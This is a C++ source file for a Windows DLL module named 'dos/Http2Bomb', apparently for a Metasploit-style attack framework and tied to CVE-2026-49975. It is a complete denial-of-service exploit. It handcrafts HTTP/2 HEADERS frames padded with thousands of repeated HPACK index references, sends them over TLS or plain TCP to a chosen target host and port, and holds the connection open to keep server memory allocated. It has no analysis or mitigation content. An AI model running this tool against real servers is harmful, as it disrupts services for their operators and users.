#include "../../Module/ModuleBase.h"
#include "../../Utils/Color.h"
#include <iostream>
#define WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <TlHelp32.h>
#include <chrono>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <filesystem>
#include <openssl/applink.c>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <stdexcept>
#include <string>
#include <string_view>
#include <vector>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")

static const std::string CLIENT_PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

constexpr uint8_t SETTINGS_FRAME_TYPE = 0x04;
constexpr uint8_t HEADERS_FRAME_TYPE = 0x01;
constexpr uint8_t WINDOW_UPDATE_FRAME_TYPE = 0x08;
constexpr uint8_t PING_FRAME_TYPE = 0x06;
constexpr uint8_t GOAWAY_FRAME_TYPE = 0x07;
constexpr uint8_t RST_STREAM_FRAME_TYPE = 0x03;

constexpr uint8_t FLAG_END_HEADERS = 0x04;
constexpr uint8_t FLAG_END_STREAM = 0x01;

struct Config {
  std::string Host;
  uint16_t Port;
  bool NoTls;
  std::string Path = "/";
  uint32_t References;
  uint32_t Streams;
  uint32_t HoldSec;
};

std::vector<uint8_t> BuildFrame(uint8_t FrameType, uint8_t Flags,
                                uint32_t StreamId,
                                const std::vector<uint8_t> &Payload) {
  uint32_t Length = static_cast<uint32_t>(Payload.size());

  std::vector<uint8_t> Frame;
  Frame.reserve(9 + Payload.size());

  Frame.push_back(static_cast<uint8_t>((Length >> 16) & 0xFF));
  Frame.push_back(static_cast<uint8_t>((Length >> 8) & 0xFF));
  Frame.push_back(static_cast<uint8_t>(Length & 0xFF));

  Frame.push_back(FrameType);
  Frame.push_back(Flags);

  uint32_t Sid = StreamId & 0x7FFFFFFF;
  Frame.push_back(static_cast<uint8_t>((Sid >> 24) & 0xFF));
  Frame.push_back(static_cast<uint8_t>((Sid >> 16) & 0xFF));
  Frame.push_back(static_cast<uint8_t>((Sid >> 8) & 0xFF));
  Frame.push_back(static_cast<uint8_t>(Sid & 0xFF));

  Frame.insert(Frame.end(), Payload.begin(), Payload.end());
  return Frame;
}

std::vector<uint8_t> BuildPing(uint32_t StreamId = 0) {
  std::vector<uint8_t> Payload(8, 0x00);
  return BuildFrame(PING_FRAME_TYPE, 0x00, StreamId, Payload);
}

std::vector<uint8_t> BuildHeadersFrame(uint32_t StreamId,
                                       uint32_t IndexedReferences = 2048) {
  const std::string Name = "cookie";
  const std::string Value = std::string(255, 'a');

  std::vector<uint8_t> HeaderBlock;
  HeaderBlock.push_back(static_cast<uint8_t>(0x40 | Name.size()));
  HeaderBlock.insert(HeaderBlock.end(), Name.begin(), Name.end());
  HeaderBlock.push_back(static_cast<uint8_t>(Value.size()));
  HeaderBlock.insert(HeaderBlock.end(), Value.begin(), Value.end());

  HeaderBlock.resize(HeaderBlock.size() + IndexedReferences, 0xBE);

  return BuildFrame(HEADERS_FRAME_TYPE, FLAG_END_HEADERS | FLAG_END_STREAM,
                    StreamId, HeaderBlock);
}

std::vector<uint8_t> BuildSettings() {
  std::vector<uint8_t> Payload;
  Payload.reserve(12);

  Payload.push_back(0x00);
  Payload.push_back(0x04);
  Payload.push_back(0x00);
  Payload.push_back(0x00);
  Payload.push_back(0x00);
  Payload.push_back(0x00);

  Payload.push_back(0x00);
  Payload.push_back(0x05);
  Payload.push_back(0x00);
  Payload.push_back(0x00);
  Payload.push_back(0x40);
  Payload.push_back(0x00);

  return BuildFrame(SETTINGS_FRAME_TYPE, 0x00, 0, Payload);
}

std::vector<uint8_t> BuildWindowUpdate(uint32_t StreamId, uint32_t Increment) {
  uint32_t Inc = Increment & 0x7FFFFFFF;
  std::vector<uint8_t> Payload;
  Payload.push_back(static_cast<uint8_t>((Inc >> 24) & 0xFF));
  Payload.push_back(static_cast<uint8_t>((Inc >> 16) & 0xFF));
  Payload.push_back(static_cast<uint8_t>((Inc >> 8) & 0xFF));
  Payload.push_back(static_cast<uint8_t>(Inc & 0xFF));

  return BuildFrame(WINDOW_UPDATE_FRAME_TYPE, 0x00, StreamId, Payload);
}

class WinsockGuard {
public:
  WinsockGuard() {
    WSADATA Wsa;
    if (WSAStartup(MAKEWORD(2, 2), &Wsa) != 0)
      throw std::runtime_error("WSAStartup failed");
  }
  ~WinsockGuard() { WSACleanup(); }

  WinsockGuard(const WinsockGuard &) = delete;
  WinsockGuard &operator=(const WinsockGuard &) = delete;
};

class SocketGuard {
public:
  explicit SocketGuard(SOCKET S) : Sock_(S) {}
  ~SocketGuard() {
    if (Sock_ != INVALID_SOCKET)
      closesocket(Sock_);
  }

  SocketGuard(const SocketGuard &) = delete;
  SocketGuard &operator=(const SocketGuard &) = delete;

  SOCKET Get() const { return Sock_; }

private:
  SOCKET Sock_;
};

class SSLGuard {
public:
  explicit SSLGuard(SSL *Ssl) : Ssl_(Ssl) {}
  ~SSLGuard() {
    if (Ssl_)
      SSL_free(Ssl_);
  }

  SSLGuard(SSLGuard &&Other) noexcept : Ssl_(Other.Ssl_) {
    Other.Ssl_ = nullptr;
  }
  SSLGuard &operator=(SSLGuard &&Other) noexcept {
    if (this != &Other) {
      if (Ssl_)
        SSL_free(Ssl_);
      Ssl_ = Other.Ssl_;
      Other.Ssl_ = nullptr;
    }
    return *this;
  }

  SSLGuard(const SSLGuard &) = delete;
  SSLGuard &operator=(const SSLGuard &) = delete;

  SSL *Get() const { return Ssl_; }

private:
  SSL *Ssl_;
};

class SSLCtxGuard {
public:
  explicit SSLCtxGuard(SSL_CTX *Ctx) : Ctx_(Ctx) {}
  ~SSLCtxGuard() {
    if (Ctx_)
      SSL_CTX_free(Ctx_);
  }

  SSLCtxGuard(const SSLCtxGuard &) = delete;
  SSLCtxGuard &operator=(const SSLCtxGuard &) = delete;

  SSL_CTX *Get() const { return Ctx_; }

private:
  SSL_CTX *Ctx_;
};

SOCKET ConnectTcp(const std::string &Host, uint16_t Port, double TimeoutSec) {
  addrinfo Hints{};
  Hints.ai_family = AF_UNSPEC;
  Hints.ai_socktype = SOCK_STREAM;

  std::string PortStr = std::to_string(Port);
  addrinfo *Result = nullptr;
  int Ret = getaddrinfo(Host.c_str(), PortStr.c_str(), &Hints, &Result);
  if (Ret != 0)
    throw std::runtime_error("getaddrinfo: " + std::string(gai_strerrorA(Ret)));

  struct AddrInfoGuard {
    addrinfo *Ptr;
    ~AddrInfoGuard() {
      if (Ptr)
        freeaddrinfo(Ptr);
    }
  } Guard{Result};

  SOCKET Sock = INVALID_SOCKET;
  std::string LastError;

  for (addrinfo *Rp = Result; Rp; Rp = Rp->ai_next) {
    Sock = socket(Rp->ai_family, Rp->ai_socktype, Rp->ai_protocol);
    if (Sock == INVALID_SOCKET)
      continue;

    DWORD TimeoutMs = static_cast<DWORD>(TimeoutSec * 1000.0);
    if (TimeoutMs > 0) {
      setsockopt(Sock, SOL_SOCKET, SO_RCVTIMEO,
                 reinterpret_cast<const char *>(&TimeoutMs), sizeof(TimeoutMs));
      setsockopt(Sock, SOL_SOCKET, SO_SNDTIMEO,
                 reinterpret_cast<const char *>(&TimeoutMs), sizeof(TimeoutMs));
    }

    if (connect(Sock, Rp->ai_addr, static_cast<int>(Rp->ai_addrlen)) == 0)
      return Sock;

    LastError = std::to_string(WSAGetLastError());
    closesocket(Sock);
    Sock = INVALID_SOCKET;
  }

  throw std::runtime_error("ConnectTcp failed: " + LastError);
}

SSL *WrapTls(SOCKET Sock, const std::string &ServerHostname) {
  SSL_library_init();
  OpenSSL_add_all_algorithms();
  SSL_load_error_strings();

  SSL_CTX *Ctx = SSL_CTX_new(TLS_client_method());
  if (!Ctx)
    throw std::runtime_error("SSL_CTX_new failed");
  SSLCtxGuard CtxGuard(Ctx);

  const unsigned char Alpn[] = "\x02h2";
  SSL_CTX_set_alpn_protos(Ctx, Alpn, sizeof(Alpn) - 1);

  SSL *Ssl = SSL_new(Ctx);
  if (!Ssl)
    throw std::runtime_error("SSL_new failed");

  SSL_set_fd(Ssl, static_cast<int>(Sock));
  SSL_set_tlsext_host_name(Ssl, ServerHostname.c_str());

  if (SSL_connect(Ssl) != 1) {
    unsigned long Err = ERR_get_error();
    char ErrBuf[256]{};
    if (Err != 0)
      ERR_error_string_n(Err, ErrBuf, sizeof(ErrBuf));
    else
      snprintf(ErrBuf, sizeof(ErrBuf), "socket=%d", WSAGetLastError());
    SSL_free(Ssl);
    throw std::runtime_error("SSL_connect failed: " + std::string(ErrBuf));
  }

  SSL_CTX_up_ref(Ctx);
  return Ssl;
}

void SendExact(SOCKET Sock, const std::vector<uint8_t> &Data) {
  const char *Ptr = reinterpret_cast<const char *>(Data.data());
  int Remaining = static_cast<int>(Data.size());
  while (Remaining > 0) {
    int Sent = ::send(Sock, Ptr, Remaining, 0);
    if (Sent == SOCKET_ERROR)
      throw std::runtime_error("send failed: " +
                               std::to_string(WSAGetLastError()));
    if (Sent == 0)
      throw std::runtime_error("connection closed while sending");
    Ptr += Sent;
    Remaining -= Sent;
  }
}

void SendExactSsl(SSL *Ssl, const std::vector<uint8_t> &Data) {
  const char *Ptr = reinterpret_cast<const char *>(Data.data());
  int Remaining = static_cast<int>(Data.size());
  while (Remaining > 0) {
    int Sent = SSL_write(Ssl, Ptr, Remaining);
    if (Sent <= 0) {
      int Err = SSL_get_error(Ssl, Sent);
      throw std::runtime_error("SSL_write failed: " + std::to_string(Err));
    }
    Ptr += Sent;
    Remaining -= Sent;
  }
}

void SendExact(SOCKET Sock, const std::string &Data) {
  std::vector<uint8_t> Vec(Data.begin(), Data.end());
  SendExact(Sock, Vec);
}

void SendExactSsl(SSL *Ssl, const std::string &Data) {
  std::vector<uint8_t> Vec(Data.begin(), Data.end());
  SendExactSsl(Ssl, Vec);
}

void RecvForever(SOCKET Sock, double EndTime) {
  char Buf[4096];
  while (true) {
    double Remaining =
        EndTime - std::chrono::duration<double>(
                      std::chrono::steady_clock::now().time_since_epoch())
                      .count();
    if (Remaining <= 0)
      break;

    DWORD Rto = static_cast<DWORD>(Remaining * 1000.0);
    setsockopt(Sock, SOL_SOCKET, SO_RCVTIMEO,
               reinterpret_cast<const char *>(&Rto), sizeof(Rto));

    int N = recv(Sock, Buf, sizeof(Buf), 0);
    if (N == 0)
      break;
    if (N == SOCKET_ERROR) {
      int Err = WSAGetLastError();
      if (Err == WSAETIMEDOUT)
        continue;
      break;
    }
  }
}

void RecvForeverSsl(SSL *Ssl, double EndTime) {
  int Fd = SSL_get_fd(Ssl);
  char Buf[4096];
  while (true) {
    double Remaining =
        EndTime - std::chrono::duration<double>(
                      std::chrono::steady_clock::now().time_since_epoch())
                      .count();
    if (Remaining <= 0)
      break;

    DWORD Rto = static_cast<DWORD>(Remaining * 1000.0);
    setsockopt(Fd, SOL_SOCKET, SO_RCVTIMEO,
               reinterpret_cast<const char *>(&Rto), sizeof(Rto));

    int N = SSL_read(Ssl, Buf, sizeof(Buf));
    if (N <= 0) {
      int Err = SSL_get_error(Ssl, N);
      if (Err == SSL_ERROR_WANT_READ || Err == SSL_ERROR_WANT_WRITE)
        continue;
      break;
    }
  }
}

bool PortOpen(const std::string &Host, uint16_t Port, int TimeoutSec = 3) {
  WSADATA Wsa;
  if (WSAStartup(MAKEWORD(2, 2), &Wsa) != 0)
    return false;

  addrinfo Hints{};
  Hints.ai_family = AF_UNSPEC;
  Hints.ai_socktype = SOCK_STREAM;

  addrinfo *Result = nullptr;
  if (getaddrinfo(Host.c_str(), std::to_string(Port).c_str(), &Hints,
                  &Result) != 0) {
    WSACleanup();
    return false;
  }

  SOCKET Sock = INVALID_SOCKET;
  bool Open = false;

  for (addrinfo *Rp = Result; Rp && !Open; Rp = Rp->ai_next) {
    Sock = socket(Rp->ai_family, Rp->ai_socktype, Rp->ai_protocol);
    if (Sock == INVALID_SOCKET)
      continue;

    DWORD To = TimeoutSec * 1000;
    setsockopt(Sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&To, sizeof(To));
    setsockopt(Sock, SOL_SOCKET, SO_SNDTIMEO, (const char *)&To, sizeof(To));

    if (connect(Sock, Rp->ai_addr, (int)Rp->ai_addrlen) == 0)
      Open = true;
    closesocket(Sock);
  }

  freeaddrinfo(Result);
  WSACleanup();
  return Open;
}

class Http2Bomb : public ModuleBase {
public:
  Http2Bomb() {
    RegisterOption("RHOST",
                   std::make_unique<OptString>("", OptionRequired::Required,
                                               "The target IPV4 address"));
    RegisterOption("RPORT",
                   std::make_unique<OptInt>("", OptionRequired::Required,
                                            "The target port"));
    RegisterOption("Path",
                   std::make_unique<OptString>("/", OptionRequired::Required,
                                               "The target path"));
    RegisterOption("References",
                   std::make_unique<OptInt>("2048", OptionRequired::Required,
                                            "HPACK index references"));
    RegisterOption(
        "NoTLS", std::make_unique<OptString>("false", OptionRequired::Required,
                                             "HPACK index references"));
    RegisterOption("Streams",
                   std::make_unique<OptInt>("1", OptionRequired::Required,
                                            "Number of streams"));
    RegisterOption("HoldSec",
                   std::make_unique<OptInt>("30", OptionRequired::Required,
                                            "Hold connection alive"));
  }

  ModuleInfo Info() const override {
    ModuleInfo Info;
    Info.Name = "dos/Http2Bomb";
    Info.Description = "CVE-2026-49975";
    Info.Author = "RegistryEdit";
    Info.License = "DLL_LICENSE";
    Info.Type = ModuleType::Auxiliary;
    Info.Targets = {"Windows 10 x64", "Windows 11 x64"};
    Info.DefaultTarget = "Windows 10 x64";
    Info.Platform = {"Windows"};
    Info.Arch = "x64";
    Info.DisclosureDate = "NULL";
    Info.References = {"NULL", "NULL"};
    Info.Rank = 300;
    return Info;
  }

  bool Check() override {
    Color::PrintInfo() << "Checking "
                       << GetOption("RHOST") + ":" + GetOption("RPORT") << "..."
                       << std::endl;
    return PortOpen(GetOption("RHOST"), stoul(GetOption("RPORT")), 3);
  }

  bool Run() override {
    Color::PrintInfo() << "Target Host: "
                       << GetOption("RHOST") + ":" + GetOption("RPORT") +
                              GetOption("Path")
                       << std::endl;
    std::cout << std::endl;

    WinsockGuard Wsa;
    struct Config Cfg;
    Cfg.Host = GetOption("RHOST");
    Cfg.Port = stoul(GetOption("RPORT"));
    Cfg.References = stoul(GetOption("References"));
    Cfg.Streams = stoul(GetOption("Streams"));
    Cfg.HoldSec = stoul(GetOption("HoldSec"));
    Cfg.Path = GetOption("Path");
    if (GetOption("NoTLS") == "false")
      Cfg.NoTls = false;
    if (GetOption("NoTLS") == "true")
      Cfg.NoTls = true;
    bool UseTls = !Cfg.NoTls;

    Color::PrintInfo() << "Target: " << Cfg.Host << ":" << Cfg.Port
                       << " TLS=" << (UseTls ? "true" : "false")
                       << " Path=" << Cfg.Path << "\n";
    Color::PrintInfo() << "Streams=" << Cfg.Streams
                       << " References=" << Cfg.References
                       << " Hold_Seconds=" << Cfg.HoldSec << "\n";

    try {
      SocketGuard Sock(ConnectTcp(Cfg.Host, Cfg.Port, 10.0));
      SSLGuard SslGuard(nullptr);
      bool HaveSsl = false;

      if (UseTls) {
        std::string Sni = (Cfg.Host == "127.0.0.1" || Cfg.Host == "::1")
                              ? "localhost"
                              : Cfg.Host;
        SSL *SslRaw = WrapTls(Sock.Get(), Sni);
        SslGuard = SSLGuard(SslRaw);
        HaveSsl = true;
      }

      if (HaveSsl) {
        SendExactSsl(SslGuard.Get(), CLIENT_PREFACE);
        SendExactSsl(SslGuard.Get(), BuildSettings());
      } else {
        SendExact(Sock.Get(), CLIENT_PREFACE);
        SendExact(Sock.Get(), BuildSettings());
      }

      for (uint32_t StreamId = 1; StreamId < 2 * Cfg.Streams; StreamId += 2) {
        auto Frame = BuildHeadersFrame(StreamId, Cfg.References);
        if (HaveSsl)
          SendExactSsl(SslGuard.Get(), Frame);
        else
          SendExact(Sock.Get(), Frame);
      }

      Color::PrintInfo() << "Bomb payload sent. Holding connection to keep "
                            "server-side allocations alive.\n";

      double EndTime = std::chrono::duration<double>(
                           std::chrono::steady_clock::now().time_since_epoch())
                           .count() +
                       static_cast<double>(Cfg.HoldSec);

      if (HaveSsl)
        RecvForeverSsl(SslGuard.Get(), EndTime);
      else
        RecvForever(Sock.Get(), EndTime);

      Color::PrintInfo() << "Done.\n";
      Color::PrintGood() << "Attack Successfully" << std::endl;
      return true;
    } catch (const std::exception &E) {
      Color::PrintBad() << E.what() << "\n";
      return false;
    }
  }
};

BOOL APIENTRY DllMain(HMODULE, DWORD Reason, LPVOID) {
  if (Reason == DLL_PROCESS_ATTACH)
    DisableThreadLibraryCalls(GetModuleHandle(nullptr));
  return TRUE;
}

extern "C" __declspec(dllexport) ModuleBase *CreateModule() {
  return new Http2Bomb();
}

extern "C" __declspec(dllexport) void DestroyModule(ModuleBase *Module) {
  delete Module;
}
